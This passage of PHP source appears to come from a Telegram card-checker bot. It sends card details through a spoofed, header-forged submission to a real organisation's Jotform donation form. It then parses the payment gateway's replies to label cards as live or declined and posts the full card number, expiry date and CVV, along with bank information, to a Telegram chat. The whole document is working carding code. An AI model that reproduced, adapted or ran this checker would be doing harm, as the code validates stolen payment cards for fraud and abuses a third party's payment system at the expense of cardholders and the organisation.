%3Bss%2C0%2Cvachg_5_fgngr%3Bxq%2C0%2C0%3Bxh%2C0%2C0%3Bso%2C3%2Cvachg_5_fgngr%3Bxx%2C4%2C0%2Cvachg_5_cbfgny%3Bss%2C0%2Cvachg_5_cbfgny%3Bxq%2C0%2C0%3Bxh%2C0%2C0%3Bso%2C3%2Cvachg_5_cbfgny%3Bxx%2C3%2C9%2Csvefg_4%3Bss%2C0%2Csvefg_4%3Bzz%2Cq8p%2C96%2C2ps%2Cfhoynory_5_nqqe_yvar1%3Bso%2C6n5%2Csvefg_4%3Bgf%2C0%2C7803%3Bxx%2C4%2C0%2Cvachg_6%3Bss%2C0%2Cvachg_6%3Bzp%2C86%2Cor%2C3o7%2Cvachg_6%3Bxq%2C42q%2C0%3Bxh%2C0%2C0%3Bso%2C5%2Cvachg_6%3Bxx%2C5%2C0%2Cvachg_7_shyy%3Bss%2C0%2Cvachg_7_shyy%3Bxq%2C0%2C0%3Bso%2C2%2Cvachg_6%3Bxx%2C3%2C0%2Cvachg_7_shyy%3Bss%2C0%2Cvachg_7_shyy%3Bxh%2C1p%2C0%3Bxx%2C0%2C18%2Cvachg_6%3Bss%2C0%2Cvachg_6%3Bzp%2C578%2C-2o%2C3ss%2C%3Bzz%2C110%2C8%2C3ss%2Cvq_7%3Bxq%2C1n5%2C0%2Cp%3Bxh%2C88%2C0%3Bxq%2C222%2C0%2C8%3Bxh%2C71%2C0%3Bxq%2C151%2C0%2C8%3Bxh%2C5s%2C0%3Bzzf%2C3n%2C2704%2C32%2C22+0%2C191+386r%2C5q3%2C39o9%2C-p3pr%2C118qp%2Cp2%3Bxq%2C2669%2C0%3Bxh%2C22%2C0%3Bso%2C2%2Cvachg_7_shyy%3Bxx%2C6%2Cr%2Cvachg_7_shyy%3Bss%2C0%2Cvachg_7_shyy%3Bzzf%2C82%2C2715%2C32%2CABC%3Bxq%2C8p1%2C0%2Cp%3Bgf%2C0%2Co9rq%3Bxq%2C1qs%2C0%2Cp%3Bxq%2C1q%2C0%2Cp%3Bxq%2C1r%2C0%2Cp%3Bxq%2C1q%2C0%2Cp%3Bxq%2C1s%2C0%2Cp%3Bxq%2C1q%2C0%2Cp%3Bxq%2C1r%2C0%2Cp%3Bxq%2C1r%2C0%2Cp%3Bxh%2C2%2C0%3Bxq%2C75%2C0%2Cp%3Bxh%2C55%2C0%3Bxq%2C2p7%2C0%2C8%3Bxh%2Co4%2C0%3Bxq%2Cs4%2C0%2C8%3Bxh%2C65%2C0%3Bxq%2Cq2p%2C0%3Bxh%2C13%2C0%3Bso%2C1%2Cvachg_7_shyy%3Bxx%2C4%2Cr%2Cvachg_7_shyy%3Bss%2C0%2Cvachg_7_shyy%3Bzz%2C57s%2Cn0%2C3ss%2Cvachg_7_shyy%3Bzzf%2C344%2C2717%2C32%2Con+0%2C6o6+p75%2C62%2C3q1%2C-363q%2C3r76%2C1r%3Bso%2C43r%2Cvachg_7_shyy%3Bxx%2C4%2C0%2Cvachg_23_qbangvba%3Bss%2C0%2Cvachg_23_qbangvba%3Bzp%2C88%2C49%2C471%2Cvachg_23_qbangvba%3Bxq%2C53o%2C0%3Bxh%2Coq%2C0%3Bzz%2C223%2C141%2C476%2C%3Bzzf%2C1n1r%2C2703%2C32%2C2n9+792%2C1310+rr2o%2C6np%2C407n%2C-431sp%2C4s02r%2C301%3Bgf%2C0%2Css46%3Bzz%2Cqr%2Cp8%2C5nr%2Cvq_2%3Bso%2C2q5%2Cvachg_23_qbangvba%3Bxx%2C5%2C0%2Cvachg_23_pp_svefgAnzr%3Bss%2C0%2Cvachg_23_pp_svefgAnzr%3Bzp%2C82%2Cpn%2C4r2%2Cvachg_23_pp_svefgAnzr%3Bxq%2C486%2C0%3Bxh%2C0%2C0%3Bso%2C7%2Cvachg_23_pp_svefgAnzr%3Bxx%2C3%2C0%2Cvachg_23_pp_ynfgAnzr%3Bss%2C0%2Cvachg_23_pp_ynfgAnzr%3Bxq%2C0%2C0%3Bxh%2C0%2C0%3Bso%2C5%2Cvachg_23_pp_ynfgAnzr%3Bxx%2C4%2C9%2Cvachg_23_pp_svefgAnzr%3Bss%2C0%2Cvachg_23_pp_svefgAnzr%3Bso%2C689%2Cvachg_23_pp_svefgAnzr%3Bzzf%2C17p3%2C271s%2C32%2C49+309%2C0+1214p%2C6o8%2C44n1%2C-529r0%2C58334%2C-n1%3Bzz%2C1ns1%2Cps%2C55p%2Cvq_23%3Bgf%2C0%2C14156%3Bzz%2C1qr2%2Co2%2C5q8%2C%3Bzz%2C191o%2C9n%2C56q%2Cvq_23%3Bzz%2C3963%2C147%2C3s4%2Cvq_7%3Bgf%2C0%2C1o1o6%3Bxx%2C80r%2C5%2Cvachg_5_cbfgny%3Bss%2C8%2Cvachg_5_cbfgny%3Bxq%2Cp6%2C0%2C5%3Bzp%2C23%2C10%2C34p%2Cvq_5%3Bxq%2C48%2C1%3Bxh%2C6s%2C1%3Bxh%2C2%2C0%3Bso%2C775%2Cvachg_5_cbfgny%3Bzz%2C575%2C1qp%2C518%2C%3Bzz%2C4067%2C9%2C5op%2C%3Bgf%2C0%2C208os%3Bzzf%2C819%2Crn73%2C1r%2C1r+o8%2C561+q1p%2C1q2%2C6po7%2C-5n6%2C462%2C8%3Bzz%2Cosq%2C1q2%2C4n5%2C%3Bzz%2C1p37%2C1ps%2C579%2Cvq_2%3Bzz%2C1sps%2C1qs%2C5np%2Cvq_2%3Bgf%2C0%2C258qo%3Bzp%2C487%2C53%2C596%2Cvachg_2%3B%22%2C%22ns%22%3A%22%22%2C%22qvg%22%3A%22%22%2C%22vp%22%3A%22%22%2C%22ji%22%3A%22%22%7D%2C%22jg%22%3A%221.j-952168.1.2.bK3IaDqXbtD60_QrNz-waj%2C%2C.L3dJlSXlu-8BB9lWrkcBium8YZ5GROpU1_Am3PyPFuCxhWUHqKTnQ8oXvgoN9Oaws-Y6ksubvJScbM9fkzByNjOLE49sNAfwQlsWVDMpXZkS0MzO2CrOnjHkr0DcSGPO4aLDKZyL3LpwF3fJxtyYLNCcMc2BZfjjm7kZnEqS5oPisnj1YlgtKkBtbQloU2XE1iqI7PbvHemCvAc6-3zVxka4hyiCcEM-gK4TUCtE3DOCfevvmibIV4d3gTJXdUQE%22%7D&validatedRequiredFieldIDs=%7B%22id_32%22%3Atrue%2C%22id_45%22%3A%22hidden%22%2C%22id_4%22%3Atrue%2C%22id_5%22%3Atrue%2C%22id_6%22%3Atrue%2C%22id_23%22%3Atrue%7D&buyerVerification='.$verf.'&square_pm=Card&square_nonce='.$cnon;
        //echo $post2;
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://submit.jotform.us/submit/82535405014145/');
curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
// curl_setopt($ch, CURLOPT_PROXY, $proxiss[0]);
// curl_setopt($ch, CURLOPT_PROXYPORT, $proxiss[1]);
// curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username:$password");
// curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $post2);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: submit.jotform.us',
'method: POST',
'path: /submit/82535405014145/',
'scheme: https',
'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
'accept-encoding: gzip, deflate, br',
'accept-language: es-ES,es;q=0.',
'content-type: application/x-www-form-urlencoded',
'cookie: userReferer=https%3A%2F%2Fwww.icaboston.org%2F; theme=tile-black; guest=guest_0bfa9ae0be0c9e95; fromStripePayment=5450981920935914211; language=es-ES',
//'Host: www.maplelakefishingderby.com',
'Origin: https://www.icaboston.org',
'referer: https://www.icaboston.org/',
'Sec-Fetch-Dest: iframe',
'Sec-Fetch-Mode: navigate',
'Sec-Fetch-Site: cross-site',
'sec-fetch-user: ?1',
'sec-gpc: 1',
'upgrade-insecure-requests: 1',
'User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36'
));
$resultc = curl_exec($ch);
$nfo = curl_getinfo($ch,CURLINFO_RESPONSE_CODE);
$resultc1 = json_decode($resultc, true);
// $resp = trim(strip_tags(getStr2($resultc,"<span class='form-message-subtext'>","</div>"))); 
echo "\n\n".$resultc;
echo "\n\n".$nfo; 

//     $delay5 = microtimeFormat($starttime);
//     $result5 = urlencode("<b>
// ••• 💳CC ->> <code>$cc|$mes|$ano|$cvv</code> 
// ••• 🔋PROCESS ->> □□□□□□□ 50%[🟨] 
// ••• ⌛TIME -> $delay5 s 
// ••• RESPONSE---> $resultc
// ••• 👨🏻CHECKING BY ->> <a href='tg://user?id='>@$userId</a> 
// ••• 🧑🏻‍💻BOT BY :- <code>@Z_tJKkeZQoZlcssuXjVjNerQ</code></b>");
//         $su4 = reply_to2($chat_id,$message_id_4,$keyboard,$result5);
//         $respon5 = json_decode($su4, TRUE);
//         $message_id_5 = $respon5['result']['message_id'];

        if((strpos($resultc,'DECLINE'))||(strpos($resultc,'GENERIC_DECLINE')) || (strpos($resultc,'ADDRESS_VERIFICATION_FAILURE'))){
            $delay00 = microtimeFormat($starttime);
            $result00 = urlencode("<b>Status -» [BRAINTREE DECLINE] 🟥
💳CC -» <code>$cc|$mes|$ano|$cvv</code> 
Response -» <code>GENERIC_DECLINE</code>
Gateway -» BRAINTREE Auth
Time -» <b>$delay00</b><b>s</b>

------- Bin Info -------</b>
<b>Bank -»</b> $bank
<b>Brand -»</b> $schemename
<b>Type -»</b> $typename
<b>Currency -»</b> $currency
<b>Country -»</b> $cname ($emoji - 💲$currency)
<b>Issuers Contact -»</b> $phone
<b>----------------------------</b>
Proxy [ IP: $ip]
<b>Checked By <a href='tg://user?id=$userId'>$firstname</a></b>
<b>Bot By: <a href='t.me/Z_tJKkeZQoZlcssuXjVjNerQ'>Eljose</a></b>");
            $su00 = reply_to2($chat_id,$message_id_4,$keyboard,$result00);
            $result01 = json_decode($su00, TRUE);
            $message_id_5 = $respon3['result']['message_id'];

            // echo "TIME>".$delay2;
            // echo "\nRESPONSE:".$su1;
            // echo "\nMessage id ".$message_id_2;
//             return;
        }
        elseif((strpos($resultc,'PAN_FAILURE'))){
          $delay00 = microtimeFormat($starttime);
          $result00 = urlencode("<b>Status -» [BRAINTREE DECLINE] 🟥
💳CC -» <code>$cc|$mes|$ano|$cvv</code> 
Response -» <code>INCORRECT CARD NUMBER</code>
Gateway -» BRAINTREE Auth
Time -» <b>$delay00</b><b>s</b>

------- Bin Info -------</b>
<b>Bank -»</b> $bank
<b>Brand -»</b> $schemename
<b>Type -»</b> $typename
<b>Currency -»</b> $currency
<b>Country -»</b> $cname ($emoji - 💲$currency)
<b>Issuers Contact -»</b> $phone
<b>----------------------------</b>
Proxy [ IP: $ip]
<b>Checked By <a href='tg://user?id=$userId'>$firstname</a></b>
<b>Bot By: <a href='t.me/Z_tJKkeZQoZlcssuXjVjNerQ'>Eljose</a></b>");
          $su00 = reply_to2($chat_id,$message_id_4,$keyboard,$result00);
          $result01 = json_decode($su00, TRUE);
          $message_id_5 = $respon3['result']['message_id'];

          // echo "TIME>".$delay2;
          // echo "\nRESPONSE:".$su1;
          // echo "\nMessage id ".$message_id_2;
//             return;
      }
        elseif((strpos($resultc, 'CVV_FAILURE'))) {
            addTotal();
            addUserTotal($userId);
            $delay00 = microtimeFormat($starttime);
            $result00 = urlencode("<b>Status -» [LIVE CCN] 🟩
💳CC -» <code>$cc|$mes|$ano|$cvv</code> 
Response -» <code>BRAINTREE LIVE CCN</code>
Gateway -» BRAINTREE Auth
Time -» <b>$delay00</b><b>s</b>

------- Bin Info -------</b>
<b>Bank -»</b> $bank
<b>Brand -»</b> $schemename
<b>Type -»</b> $typename
<b>Currency -»</b> $currency
<b>Country -»</b> $cname ($emoji - 💲$currency)
<b>Issuers Contact -»</b> $phone
<b>----------------------------</b>
Proxy [ IP: $ip]
<b>Checked By <a href='tg://user?id=$userId'>$firstname</a></b>
<b>Bot By: <a href='t.me/Z_tJKkeZQoZlcssuXjVjNerQ'>Eljose</a></b>");
            $su00 = reply_to2($chat_id,$message_id_4,$keyboard,$result00);
            $result01 = json_decode($su00, TRUE);
            $message_id_5 = $respon3['result']['message_id'];
        }
        elseif((strpos($resultc, "TRANSACTION_LIMIT"))) {
            addTotal();
            addUserTotal($userId);
            addCCN();
            addUserCCN($userId);
            addCVV();
            addUserCVV($userId);
            $delay00 = microtimeFormat($starttime);
            $result00 = urlencode("<b>Status -» [CVV LIVE🟩] 
💳CC -» <code>$cc|$mes|$ano|$cvv</code> 
Response -» <code>BRAINTREE CVV LIVE</code>
Gateway -» BRAINTREE Auth
Time -» <b>$delay00</b><b>s</b>

------- Bin Info -------</b>
<b>Bank -»</b> $bank
<b>Brand -»</b> $schemename
<b>Type -»</b> $typename
<b>Currency -»</b> $currency
<b>Country -»</b> $cname ($emoji - 💲$currency)
<b>Issuers Contact -»</b> $phone
<b>----------------------------</b>
Proxy [ IP: $ip]
<b>Checked By <a href='tg://user?id=$userId'>$firstname</a></b>
<b>Bot By: <a href='t.me/Z_tJKkeZQoZlcssuXjVjNerQ'>Eljose</a></b>");
$su00 = reply_to2($chat_id,$message_id_4,$keyboard,$result00);
$result01 = json_decode($su00, TRUE);
$message_id_5 = $respon3['result']['message_id'];
        }
        elseif((strpos($resultc,'Field must not be blank'))){
          file_put_contents("BrainTreeCAMPOVACIO.txt",$resultc);
          $delay00 = microtimeFormat($starttime);
            $result00 = urlencode("<b>Status -» [CAMPOS VACIO⚠️] 
💳CC -» <code>$cc|$mes|$ano|$cvv</code> 
Response -» <code>CAMPOS VACIO⚠️</code>
Gateway -» BRAINTREE Auth
Time -» <b>$delay00</b><b>s</b>

------- Bin Info -------</b>
<b>Bank -»</b> $bank
<b>Brand -»</b> $schemename
<b>Type -»</b> $typename
<b>Currency -»</b> $currency
<b>Country -»</b> $cname ($emoji - 💲$currency)
<b>Issuers Contact -»</b> $phone
<b>----------------------------</b>
Proxy [ IP: $ip]
<b>Checked By <a href='tg://user?id=$userId'>$firstname</a></b>
<b>Bot By: <a href='t.me/Z_tJKkeZQoZlcssuXjVjNerQ'>Eljose</a></b>");
$su00 = reply_to2($chat_id,$message_id_4,$keyboard,$result00);
$result01 = json_decode($su00, TRUE);
$message_id_5 = $respon3['result']['message_id'];
        }
        else{
            // addTotal();
            // addUserTotal($userId);
            // addCCN();
            // addUserCCN($userId);
            // addCVV();
            // addUserCVV($userId);
            file_put_contents("BrainTreeDesconocido.txt",$resultc);
            $delay00 = microtimeFormat($starttime);
            $result00 = urlencode("<b>Status -» [DESCONOCIDO⚠️] 
💳CC -» <code>$cc|$mes|$ano|$cvv</code>
Response -» <code>⚠️BRAINTREE DESCONOCIDO Vuelvelo a intentar</code>
Gateway -» BRAINTREE Auth
Time -» <b>$delay00</b><b>s</b>

------- Bin Info -------</b>
<b>Bank -»</b> $bank
<b>Brand -»</b> $schemename
<b>Type -»</b> $typename
<b>Currency -»</b> $currency
<b>Country -»</b> $cname ($emoji - 💲$currency)
<b>Issuers Contact -»</b> $phone
<b>----------------------------</b>
Proxy [ IP: $ip]
<b>Checked By <a href='tg://user?id=$userId'>$firstname</a></b>
<b>Bot By: <a href='t.me/Z_tJKkeZQoZlcssuXjVjNerQ'>Eljose</a></b>");
$su00 = reply_to2($chat_id,$message_id_4,$keyboard,$result00);
$result01 = json_decode($su00, TRUE);
$message_id_5 = $respon3['result']['message_id'];
        }
//         elseif(strpos($msg, 'Your payment could not be taken. Please try again or use a different payment method. Processor Declined')) {
//             $delay3 = microtimeFormat($starttime);
//             $result3 = urlencode("<b>Status -» [BRAINTREE DECLINED🟥]
// Response -» <code>$msj</code>
// Gateway -» BRAINTREE Auth
// Time -» <b>$delay3</b><b>s</b>

// ------- Bin Info -------</b>
// <b>Bank -»</b> $bank
// <b>Brand -»</b> $schemename
// <b>Type -»</b> $typename
// <b>Currency -»</b> $currency
// <b>Country -»</b> $cname ($emoji - 💲$currency)
// <b>Issuers Contact -»</b> $phone
// <b>----------------------------</b>

// <b>Checked By <a href='tg://user?id=$userId'>$firstname</a></b>
// <b>Bot By: <a href='t.me/Z_tJKkeZQoZlcssuXjVjNerQ'>Eljose</a></b>");
//             $su2 = reply_to2($chat_id,$message_id_2,$keyboard,$result3);
//             $result3 = json_decode($su2, TRUE);
//             $message_id_3 = $respon3['result']['message_id'];
//         }
//         elseif(strpos($msg, 'Your payment could not be taken. Please try again or use a different payment method. Declined')) {
//             $delay3 = microtimeFormat($starttime);
//             $result3 = urlencode("<b>Status -» [BRAINTREE DECLINED🟥]
// Response -» <code>$msj</code>
// Gateway -» BRAINTREE Auth
// Time -» <b>$delay3</b><b>s</b>

// ------- Bin Info -------</b>
// <b>Bank -»</b> $bank
// <b>Brand -»</b> $schemename
// <b>Type -»</b> $typename
// <b>Currency -»</b> $currency
// <b>Country -»</b> $cname ($emoji - 💲$currency)
// <b>Issuers Contact -»</b> $phone
// <b>----------------------------</b>

// <b>Checked By <a href='tg://user?id=$userId'>$firstname</a></b>
// <b>Bot By: <a href='t.me/Z_tJKkeZQoZlcssuXjVjNerQ'>Eljose</a></b>");
//             $su2 = reply_to2($chat_id,$message_id_2,$keyboard,$result3);
//             $result3 = json_decode($su2, TRUE);
//             $message_id_3 = $respon3['result']['message_id'];
//         }else{
//             addTotal();
//             addUserTotal($userId);
//             addCCN();
//             addUserCCN($userId);
//             addCVV();
//             addUserCVV($userId);
//             $delay3 = microtimeFormat($starttime);
//             $result3 = urlencode("<b>Status -» [DECLINED UNKNOWN🟥]
// Response -» <code>$msj</code>
// Gateway -» BRAINTREE Auth
// Time -» <b>$delay3</b><b>s</b>

// ------- Bin Info -------</b>
// <b>Bank -»</b> $bank
// <b>Brand -»</b> $schemename
// <b>Type -»</b> $typename
// <b>Currency -»</b> $currency
// <b>Country -»</b> $cname ($emoji - 💲$currency)
// <b>Issuers Contact -»</b> $phone
// <b>----------------------------</b>

// <b>Checked By <a href='tg://user?id=$userId'>$firstname</a></b>
// <b>Bot By: <a href='t.me/Z_tJKkeZQoZlcssuXjVjNerQ'>Eljose</a></b>");
//             $su2 = reply_to2($chat_id,$message_id_2,$keyboard,$result3);
//             $result3 = json_decode($su2, TRUE);
//             $message_id_3 = $respon3['result']['message_id'];
//         }
        }
        else{
          $delay2 = microtimeFormat($starttime);
          $result2 = urlencode("<b>
••• 💳CC ->> <code>⚠️INGRESA UNA TARJETA VALIDA!</code> 
••• ⌛TIME ->> $delay2 s 
••• 👨🏻CHECKING BY ->> <a href='tg://user?id='>@$userId</a> 
••• 🧑🏻‍💻BOT BY :- <code>@Z_tJKkeZQoZlcssuXjVjNerQ</code></b>");
          $su1 = reply_to2($chat_id,$message_id_1,$keyboard,$result2);
          $respon2 = json_decode($su1, TRUE);
          $message_id_2 = $respon2['result']['message_id'];
        }
    }
}
// function getStr2($string, $start, $end){
//     $str = explode($start, $string);
//     $str = explode($end, $str[1]);
//     return $str[0];
// }
?>